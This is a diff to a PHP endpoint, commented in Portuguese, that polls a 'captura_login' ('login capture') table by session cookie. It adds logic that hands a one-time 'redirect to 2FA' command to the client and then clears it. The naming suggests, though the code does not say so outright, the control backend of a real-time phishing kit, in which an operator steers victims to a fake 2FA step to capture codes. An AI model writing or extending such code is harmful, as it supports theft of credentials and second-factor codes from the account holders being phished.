@@ -2,7 +2,6 @@
 header('Content-Type: application/json');
 require_once __DIR__ . '/db.php'; // Conexão com o banco
 
-// 1. Identifica o usuário pelo cookie
 $session_id = $_COOKIE['identificador_cliente'] ?? null;
 if (!$session_id) {
     echo json_encode(['status' => 'sessao_invalida']);
@@ -10,16 +9,34 @@ if (!$session_id) {
 }
 
 try {
-    // 2. Busca APENAS o status do registro mais recente para esta sessão
-    $sql = "SELECT status FROM captura_login WHERE session_id = ? ORDER BY id DESC LIMIT 1";
-    $stmt = $pdo->prepare($sql);
-    $stmt->execute([$session_id]);
-    
-    $result = $stmt->fetch(PDO::FETCH_ASSOC);
+    // 1. Busca o status mais recente para esta sessão
+    $sql_check = "SELECT id, status FROM captura_login WHERE session_id = ? ORDER BY id DESC LIMIT 1";
+    $stmt_check = $pdo->prepare($sql_check);
+    $stmt_check->execute([$session_id]);
+    $result = $stmt_check->fetch(PDO::FETCH_ASSOC);
 
-    // 3. Retorna o status encontrado ou 'nao_encontrado'
     if ($result) {
-        echo json_encode(['status' => $result['status']]);
+        $lead_id = $result['id'];
+        $current_status = $result['status'];
+
+        // Lista de comandos que precisam ser "consumidos"
+        $commands_to_consume = ['redirecionar_para_2fa'];
+
+        // 2. A LÓGICA PRINCIPAL: Verifica se o status é um comando a ser consumido
+        if (in_array($current_status, $commands_to_consume)) {
+            
+            // 3. SE FOR, limpa o comando no banco de dados imediatamente
+            $sql_update = "UPDATE captura_login SET status = 'comando_recebido' WHERE id = ?";
+            $stmt_update = $pdo->prepare($sql_update);
+            $stmt_update->execute([$lead_id]);
+
+            // 4. E SÓ ENTÃO, responde ao cliente com o comando original
+            echo json_encode(['status' => $current_status]);
+
+        } else {
+            // Se não for um comando, apenas retorna o status atual normalmente
+            echo json_encode(['status' => $current_status]);
+        }
     } else {
         echo json_encode(['status' => 'nao_encontrado']);
     }
